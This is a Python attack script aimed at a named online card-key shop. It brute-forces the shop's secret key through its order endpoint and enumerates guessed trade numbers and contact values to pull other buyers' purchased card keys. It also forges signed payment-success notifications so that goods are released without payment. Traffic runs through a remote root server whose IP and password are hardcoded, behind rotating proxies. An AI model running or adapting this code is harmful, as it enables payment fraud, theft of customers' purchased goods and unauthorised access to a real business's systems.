#!/usr/bin/env python3
"""xuxin66 order/kami deep6c - low concurrency, proxy-safe."""
import hashlib, json, os, re, subprocess, time
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import parse_qsl

TARGET = "xuxin66.top"
BASE = f"https://{TARGET}/shop"
JP, JP_PASS = "124.248.67.170", "UzHlZQDUy7XP"
OUT = Path(f"/data/automation/results/{TARGET}/deep6c_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
OUT.mkdir(parents=True, exist_ok=True)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
CK = "/tmp/xuxin66_d6c_ck.txt"
SHOWORDER = re.compile(r"showOrder\((\d+)\s*,\s*['\"]([0-9a-fA-F]{32})['\"]")


def log(m):
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {m}"
    print(line, flush=True)
    open(OUT / "deep.log", "a").write(line + "\n")


def save(n, c):
    p = OUT / n
    p.write_text(c if isinstance(c, str) else json.dumps(c, ensure_ascii=False, indent=2), encoding="utf-8")
    return p


def qg():
    subprocess.run(["/data/automation/bin/qg-proxy-fetch.sh"], capture_output=True, timeout=30)
    env = open("/data/config/proxy.env").read()
    subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP}",
         "mkdir -p /data/config /data/tmp; cat > /data/config/proxy.env"],
        input=env.encode(), capture_output=True, timeout=20,
    )


def jp(cmd, t=180):
    r = subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no",
         "-o", "ConnectTimeout=15", f"root@{JP}", cmd],
        capture_output=True, timeout=t,
    )
    return (r.stdout or b"").decode("utf-8", "replace")


def scp(local, remote):
    subprocess.run(
        ["sshpass", "-p", JP_PASS, "scp", "-o", "StrictHostKeyChecking=no", local, f"root@{JP}:{remote}"],
        capture_output=True, timeout=60,
    )


def try_json(s):
    s = (s or "").strip()
    try:
        return json.loads(s)
    except Exception:
        m = re.search(r"\{.*\}", s, re.S)
        if m:
            try:
                return json.loads(m.group(0))
            except Exception:
                return None
    return None


def warm():
    out = jp(f"""source /data/config/proxy.env
UA='{UA}'; BASE='{BASE}'; CK={CK}
rm -f $CK
code=$(curl -sk -x "$PROXY_URL" -c $CK -b $CK -o /tmp/d6c_home.html -w '%{{http_code}}' --max-time 25 -A "$UA" "$BASE/")
echo HOME=$code:$(wc -c </tmp/d6c_home.html)
python3 -c "import re;h=open('/tmp/d6c_home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\\s*=\\s*\\\"([a-f0-9]+)\\\"',h);print('CSRF='+(m.group(1) if m else ''))"
# sanity order
CSRF=$(python3 -c "import re;h=open('/tmp/d6c_home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\\s*=\\s*\\\"([a-f0-9]+)\\\"',h);print(m.group(1) if m else '')")
r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 10 -A "$UA" -e "$BASE/" -H "X-Requested-With: XMLHttpRequest" -X POST \
 --data-urlencode "id=1" --data-urlencode "skey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" --data-urlencode "csrf_token=$CSRF" \
 "$BASE/ajax.php?act=order")
echo ORDER_SANITY=$r
r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 10 -A "$UA" -H "X-Requested-With: XMLHttpRequest" -e "$BASE/" "$BASE/ajax.php?act=getcount")
echo GETCOUNT=$r
""", t=80)
    return out


def build_keys(limit=20000):
    keys = [
        "xuxin66", "xuxin", "xuxin66.top", "xuxin66vip", "xuxin079", "xuxinzfb",
        "datou111", "datou333", "虚心", "zfb", "faka", "epay", "rainbow", "caihong",
        "123456", "888888", "666666", "111111", "000000", "admin", "password",
        "ttwl66", "ttwl", "1003", "Ykfaka999", "mckuai", "syskey", "apikey",
    ]
    for b in ["xuxin66", "xuxin", "datou", "zfb", "faka", "虚心"]:
        for s in ["", "123", "888", "666", "000", "2024", "2025", "2026", "!", "@", "#", "key", "sys", "api", "top"]:
            keys.append(b + s)
    for p, lim in [
        ("/tmp/query_pwd_list.txt", 524),
        ("/data/automation/results/youhui1998.top/deep_20260801_010500/syskey_smart.txt", 8000),
        ("/data/automation/results/youhui1998.top/deep_20260801_015500/syskey_big.txt", limit),
    ]:
        if not os.path.isfile(p):
            continue
        with open(p, errors="ignore") as f:
            for i, line in enumerate(f):
                if i >= lim:
                    break
                k = line.strip()
                if 1 <= len(k) <= 64:
                    keys.append(k)
    seen, out = set(), []
    for k in keys:
        if k not in seen:
            seen.add(k)
            out.append(k)
    return out


def main():
    log(f"OUT={OUT}")
    findings = {"syskey": None, "kami": [], "query_hits": [], "notify_hits": [], "getshop": [], "trades": []}

    qg()
    w = warm()
    save("warm.txt", w)
    log(w.replace("\n", " | ")[:400])
    if "验证失败" not in w and '"code"' not in w:
        log("WARN: order sanity not ok, refresh and retry")
        time.sleep(2)
        qg()
        w = warm()
        save("warm2.txt", w)
        log(w.replace("\n", " | ")[:400])

    csrf_m = re.search(r"CSRF=([a-f0-9]+)", w)
    csrf = csrf_m.group(1) if csrf_m else ""

    # keys
    keys = build_keys(15000)
    save("keys.txt", "\n".join(keys))
    scp(str(OUT / "keys.txt"), "/data/tmp/xuxin66_d6c_keys.txt")
    log(f"keys={len(keys)}")

    # upload batch oracle: P=4, stop on first non-验证失败, report samples
    oracle_sh = r'''#!/bin/bash
source /data/config/proxy.env
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
BASE="https://xuxin66.top/shop"
CK=/tmp/xuxin66_d6c_ck.txt
OID="$1"; KEYFILE="$2"; START="$3"; COUNT="$4"; P="${5:-4}"
HIT=/tmp/xuxin66_d6c_hit.txt
rm -f "$HIT"
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 20 -A "$UA" "$BASE/" -o /tmp/d6c_home.html
CSRF=$(python3 -c "import re;h=open('/tmp/d6c_home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\s*=\s*\"([a-f0-9]+)\"',h);print(m.group(1) if m else '')")
# sanity
sr=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 8 -A "$UA" -e "$BASE/" -H "X-Requested-With: XMLHttpRequest" -X POST \
 --data-urlencode "id=$OID" --data-urlencode "skey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" --data-urlencode "csrf_token=$CSRF" \
 "$BASE/ajax.php?act=order")
echo SANITY=$sr
if [ -z "$sr" ]; then echo PROXY_DEAD; exit 2; fi
sed -n "${START},$((START+COUNT-1))p" "$KEYFILE" > /tmp/d6c_batch.txt
echo BATCH=$START:$COUNT keys=$(wc -l </tmp/d6c_batch.txt) P=$P

try_one() {
  key="$1"
  [ -f "$HIT" ] && return 0
  sk=$(printf '%s' "${OID}${key}${OID}" | md5sum | awk '{print $1}')
  r=$(curl -sk -x "$PROXY_URL" -b "$CK" -c "$CK" --max-time 5 -A "$UA" -e "$BASE/" \
    -H "X-Requested-With: XMLHttpRequest" -X POST \
    --data-urlencode "id=$OID" --data-urlencode "skey=$sk" --data-urlencode "csrf_token=$CSRF" \
    "$BASE/ajax.php?act=order" 2>/dev/null)
  if [ -n "$r" ] && ! echo "$r" | grep -q '验证失败'; then
    echo "HIT|$OID|$key|$sk|$r" | tee "$HIT"
  fi
}
export -f try_one
export PROXY_URL CK BASE UA CSRF OID HIT
cat /tmp/d6c_batch.txt | xargs -P "$P" -I{} bash -c 'try_one "$@"' _ {}
if [ -f "$HIT" ]; then cat "$HIT"; else echo "MISS_BATCH|$START"; fi
'''
    open("/tmp/xuxin66_d6c_oracle.sh", "w").write(oracle_sh)
    scp("/tmp/xuxin66_d6c_oracle.sh", "/data/tmp/xuxin66_d6c_oracle.sh")
    jp("chmod +x /data/tmp/xuxin66_d6c_oracle.sh")

    syskey = None
    oid = 11240
    batch = 400
    for start in range(1, min(len(keys), 12000) + 1, batch):
        qg()
        log(f"oracle oid={oid} start={start}")
        out = jp(f"bash /data/tmp/xuxin66_d6c_oracle.sh {oid} /data/tmp/xuxin66_d6c_keys.txt {start} {batch} 4", t=500)
        save(f"oracle_{start}.txt", out or "")
        log((out or "")[:220])
        if "PROXY_DEAD" in (out or ""):
            log("proxy dead, refresh retry")
            qg()
            out = jp(f"bash /data/tmp/xuxin66_d6c_oracle.sh {oid} /data/tmp/xuxin66_d6c_keys.txt {start} {batch} 3", t=500)
            save(f"oracle_{start}_retry.txt", out or "")
            log((out or "")[:220])
        if out and "HIT|" in out:
            for line in out.splitlines():
                if line.startswith("HIT|"):
                    parts = line.split("|", 4)
                    syskey = parts[2]
                    findings["syskey"] = syskey
                    findings["kami"].append({"via": "syskey", "body": parts[4][:4000]})
                    save("SYS_KEY.txt", syskey)
                    log(f"SYS_KEY={syskey}")
                    break
        if syskey:
            break

    # dump if syskey
    if syskey:
        qg()
        dump = jp(f"""source /data/config/proxy.env
UA='{UA}'; BASE='{BASE}'; CK={CK}; KEY='{syskey}'
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 20 -A "$UA" "$BASE/" -o /tmp/d6c_home.html
CSRF=$(python3 -c "import re;h=open('/tmp/d6c_home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\\s*=\\s*\\\"([a-f0-9]+)\\\"',h);print(m.group(1) if m else '')")
for oid in $(seq 11240 -1 11180); do
  sk=$(printf '%s' "${{oid}}${{KEY}}${{oid}}" | md5sum | awk '{{print $1}}')
  r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 5 -A "$UA" -e "$BASE/" -H "X-Requested-With: XMLHttpRequest" -X POST \
   --data-urlencode "id=$oid" --data-urlencode "skey=$sk" --data-urlencode "csrf_token=$CSRF" "$BASE/ajax.php?act=order")
  echo "ORD|$oid|$r"
done
""", t=500)
        save("order_dump.txt", dump or "")
        for line in (dump or "").splitlines():
            if "kminfo" in line or '"code":0' in line:
                findings["kami"].append({"via": "dump", "line": line[:4000]})

    # query spray
    log("[2] query spray")
    contacts = ["123456", "888888", "666666", "111111", "000000", "123123", "5201314",
                "datou111", "datou333", "xuxin66", "xuxin", "admin", "test", "qq",
                "13800138000", "18888888888", "10000", "10086", "@xuxin66vip", "xuxin079"]
    if os.path.isfile("/tmp/query_pwd_list.txt"):
        with open("/tmp/query_pwd_list.txt", errors="ignore") as f:
            for i, line in enumerate(f):
                if i > 180:
                    break
                v = line.strip()
                if 4 <= len(v) <= 32:
                    contacts.append(v)
    for p in ["130", "138", "139", "150", "158", "188", "189"]:
        contacts += [p + "00000000", p + "11111111", p + "88888888"]
    contacts = list(dict.fromkeys(contacts))
    save("contacts.txt", "\n".join(contacts))
    scp(str(OUT / "contacts.txt"), "/data/tmp/xuxin66_d6c_contacts.txt")
    qg()
    qout = jp(f"""source /data/config/proxy.env
UA='{UA}'; BASE='{BASE}'; CK={CK}
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 20 -A "$UA" "$BASE/" -o /tmp/d6c_home.html
CSRF=$(python3 -c "import re;h=open('/tmp/d6c_home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\\s*=\\s*\\\"([a-f0-9]+)\\\"',h);print(m.group(1) if m else '')")
n=0
while IFS= read -r c; do
  [ -z "$c" ] && continue
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$c")
  curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 8 -A "$UA" "$BASE/?mod=query&data=$enc" -o /tmp/d6c_q.html
  if grep -q showOrder /tmp/d6c_q.html; then
    echo "HTMLHIT|$c"
    grep -oE "showOrder\\([0-9]+[[:space:]]*,[[:space:]]*'[0-9a-fA-F]+'\\)" /tmp/d6c_q.html | head -20
  fi
  r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 6 -A "$UA" -e "$BASE/?mod=query" -H "X-Requested-With: XMLHttpRequest" -X POST \
   --data-urlencode "qq=$c" --data-urlencode "type=0" --data-urlencode "page=1" --data-urlencode "csrf_token=$CSRF" \
   "$BASE/ajax.php?act=query")
  if echo "$r" | grep -q '"skey"'; then echo "AJAXHIT|$c|$r"; fi
  n=$((n+1))
  [ $((n % 40)) -eq 0 ] && echo "PROG|$n"
  sleep 0.05
done < /data/tmp/xuxin66_d6c_contacts.txt
echo "QUERY_DONE|$n"
""", t=900)
    save("query_spray.txt", qout or "")
    log("query " + (qout or "")[:300])
    for line in (qout or "").splitlines():
        if "HTMLHIT|" in line or "AJAXHIT|" in line or line.startswith("showOrder"):
            findings["query_hits"].append(line[:1500])
        m = SHOWORDER.search(line)
        if m:
            oid, skey = m.group(1), m.group(2)
            body = jp(f"""source /data/config/proxy.env
UA='{UA}'; BASE='{BASE}'; CK={CK}
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 8 -A "$UA" -e "$BASE/?mod=query" -H "X-Requested-With: XMLHttpRequest" -X POST \
 --data-urlencode "id={oid}" --data-urlencode "skey={skey}" "$BASE/ajax.php?act=order"; echo
""", t=40)
            findings["kami"].append({"via": "query", "id": oid, "skey": skey, "body": (body or "")[:4000]})
            if not syskey:
                for k in keys:
                    if hashlib.md5(f"{oid}{k}{oid}".encode()).hexdigest().lower() == skey.lower():
                        syskey = k
                        findings["syskey"] = k
                        save("SYS_KEY.txt", k)
                        log(f"SYS_KEY from pair {k}")
                        break

    # pay + notify
    log("[3] pay+notify")
    qg()
    buy = jp(f"""source /data/config/proxy.env
UA='{UA}'; BASE='{BASE}'; CK={CK}
rm -f $CK
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 25 -A "$UA" "$BASE/" -o /tmp/d6c_home.html
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 20 -A "$UA" "$BASE/?mod=buy&cid=15&tid=168" -o /tmp/d6c_buy.html
python3 -c "import re;h=open('/tmp/d6c_buy.html',encoding='utf-8',errors='ignore').read();m=re.search(r'var hashsalt=(.+?);',h);open('/tmp/d6c_hs.txt','w').write(m.group(1) if m else '');c=re.search(r'csrf_token\\s*=\\s*\\\"([a-f0-9]+)\\\"',h);open('/tmp/d6c_csrf.txt','w').write(c.group(1) if c else '');print('ok',len(open('/tmp/d6c_hs.txt').read()))"
""", t=80)
    log(buy[:200])
    expr = jp("cat /tmp/d6c_hs.txt").strip()
    csrf2 = jp("cat /tmp/d6c_csrf.txt").strip()
    hs = ""
    if expr:
        proc = subprocess.run(["node", "-e", f"console.log({expr})"], capture_output=True, text=True, timeout=10)
        hs = proc.stdout.strip()
    inputv = f"kami{datetime.now().strftime('%H%M%S')}"
    pay = jp(f"""source /data/config/proxy.env
UA='{UA}'; BASE='{BASE}'; CK={CK}
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 15 -A "$UA" -e "$BASE/?mod=buy&cid=15&tid=168" -H "X-Requested-With: XMLHttpRequest" -X POST \
 --data-urlencode "tid=168" --data-urlencode "inputvalue={inputv}" --data-urlencode "num=1" \
 --data-urlencode "hashsalt={hs}" --data-urlencode "csrf_token={csrf2}" "$BASE/ajax.php?act=pay"; echo
""", t=40)
    save("pay.json", pay or "")
    pj = try_json(pay)
    trade = (pj or {}).get("trade_no")
    log(f"trade={trade} input={inputv}")
    if trade:
        findings["trades"].append(trade)
        sub = jp(f"""source /data/config/proxy.env
UA='{UA}'; BASE='{BASE}'; CK={CK}
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 15 -A "$UA" "$BASE/other/submit.php?type=alipay&orderid={trade}" -o /tmp/d6c_sub.html
grep -oE 'https?://[^\"'\\'' <>]+' /tmp/d6c_sub.html | head -3
""", t=40)
        save("submit.txt", sub or "")
        money, pid = "9", "1003"
        um = re.search(r"https?://[^\s]+", sub or "")
        if um:
            q = dict(parse_qsl(um.group(0).split("?", 1)[-1], keep_blank_values=True))
            money = q.get("money", money)
            pid = q.get("pid", pid)
            save("submit_params.json", q)
        # notify first 2500 keys sequential batches on JP P=4
        nkeys = keys[:2500]
        save("notify_keys.txt", "\n".join(nkeys))
        scp(str(OUT / "notify_keys.txt"), "/data/tmp/xuxin66_d6c_nkeys.txt")
        for start in range(1, len(nkeys) + 1, 500):
            end = start + 499
            qg()
            nout = jp(f"""source /data/config/proxy.env
UA='{UA}'; BASE='{BASE}'; CK={CK}
TRADE='{trade}'; MONEY='{money}'; PID='{pid}'
sed -n '{start},{end}p' /data/tmp/xuxin66_d6c_nkeys.txt > /tmp/nk.txt
export PROXY_URL CK BASE UA TRADE MONEY PID
try() {{
  key="$1"
  sign=$(MONEY="$MONEY" TRADE="$TRADE" PID="$PID" KEY="$key" python3 -c 'import hashlib,os;p={{"pid":os.environ["PID"],"type":"alipay","out_trade_no":os.environ["TRADE"],"notify_url":"https://xuxin66.top/shop/other/epay_notify.php","return_url":"https://xuxin66.top/shop/other/epay_return.php","name":"test","money":os.environ["MONEY"],"trade_no":os.environ["TRADE"],"trade_status":"TRADE_SUCCESS"}};items=sorted(k for k in p if p[k]!="");s="&".join(f"{{k}}={{p[k]}}" for k in items)+os.environ["KEY"];print(hashlib.md5(s.encode()).hexdigest())')
  r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 5 -A "$UA" -X POST \
   --data-urlencode "pid=$PID" --data-urlencode "type=alipay" --data-urlencode "out_trade_no=$TRADE" \
   --data-urlencode "trade_no=$TRADE" --data-urlencode "notify_url=https://xuxin66.top/shop/other/epay_notify.php" \
   --data-urlencode "return_url=https://xuxin66.top/shop/other/epay_return.php" --data-urlencode "name=test" \
   --data-urlencode "money=$MONEY" --data-urlencode "trade_status=TRADE_SUCCESS" --data-urlencode "sign=$sign" \
   --data-urlencode "sign_type=MD5" "$BASE/other/epay_notify.php")
  if [ -n "$r" ] && [ "$r" != "error" ] && [ "$r" != "fail" ] && [ "$r" != "FAIL" ]; then echo "NOTIFYHIT|$key|$r"; fi
}}
export -f try
cat /tmp/nk.txt | xargs -P 4 -I{{}} bash -c 'try "$@"' _ {{}}
echo NBATCH|{start}
""", t=400)
            save(f"notify_{start}.txt", nout or "")
            log(f"notify batch {start}: {(nout or '')[:180]}")
            for line in (nout or "").splitlines():
                if line.startswith("NOTIFYHIT|"):
                    findings["notify_hits"].append(line[:1000])
            if findings["notify_hits"]:
                break
        # post-check
        chk = jp(f"""source /data/config/proxy.env
UA='{UA}'; BASE='{BASE}'; CK={CK}
echo GS=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 8 -A "$UA" "$BASE/other/getshop.php?trade_no={trade}")
enc=$(python3 -c "import urllib.parse;print(urllib.parse.quote('{inputv}'))")
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 10 -A "$UA" "$BASE/?mod=query&data=$enc" -o /tmp/d6c_q2.html
grep -q showOrder /tmp/d6c_q2.html && echo PAIDQUERY && grep -oE "showOrder\\([^)]+\\)" /tmp/d6c_q2.html | head
""", t=40)
        save("post_notify_check.txt", chk or "")
        log(chk[:300])

    # getshop dense recent
    log("[4] getshop dense")
    now = datetime.now()
    cands = []
    for off in range(0, 4 * 3600, 3):
        t = now - timedelta(seconds=off)
        for suf in range(100, 1000, 13):
            cands.append(t.strftime("%Y%m%d%H%M%S") + f"{suf:03d}")
    base = datetime(2026, 8, 3, 6, 44, 0)
    for off in range(-200, 201):
        t = base + timedelta(seconds=off)
        for suf in range(100, 1000, 19):
            cands.append(t.strftime("%Y%m%d%H%M%S") + f"{suf:03d}")
    cands = list(dict.fromkeys(cands))[:5000]
    save("tn.txt", "\n".join(cands))
    scp(str(OUT / "tn.txt"), "/data/tmp/xuxin66_d6c_tn.txt")
    for start in range(1, len(cands) + 1, 800):
        end = start + 799
        qg()
        gout = jp(f"""source /data/config/proxy.env
UA='{UA}'; BASE='{BASE}'; CK={CK}
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 15 -A "$UA" "$BASE/" -o /dev/null
sed -n '{start},{end}p' /data/tmp/xuxin66_d6c_tn.txt > /tmp/tnb.txt
export PROXY_URL CK BASE UA
try() {{
  tn="$1"
  r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 3 -A "$UA" "$BASE/other/getshop.php?trade_no=$tn" 2>/dev/null)
  if [ -n "$r" ] && ! echo "$r" | grep -q '未付款'; then
    if echo "$r" | grep -Eq '"code":0|卡密|kminfo'; then echo "GSHIT|$tn|$r"; 
    elif ! echo "$r" | grep -q '订单不存在' && ! echo "$r" | grep -q '"code":-1'; then echo "GSOTHER|$tn|$r"; fi
  fi
}}
export -f try
cat /tmp/tnb.txt | xargs -P 5 -I{{}} bash -c 'try "$@"' _ {{}}
echo GSBATCH|{start}
""", t=500)
        save(f"getshop_{start}.txt", gout or "")
        log(f"getshop {start}: {(gout or '')[:200]}")
        for line in (gout or "").splitlines():
            if line.startswith("GS"):
                findings["getshop"].append(line[:2000])

    save("FINDINGS.json", findings)
    md = f"""# xuxin66 订单/卡密 deep6c

- OUT: {OUT}
- SYS_KEY: `{findings['syskey']}`
- kami: {len(findings['kami'])}
- query hits: {len(findings['query_hits'])}
- notify hits: {len(findings['notify_hits'])}
- getshop interesting: {len(findings['getshop'])}
- trades: {findings['trades']}
"""
    save("SUMMARY.md", md)
    log("===== DONE =====")
    print(md)


if __name__ == "__main__":
    main()
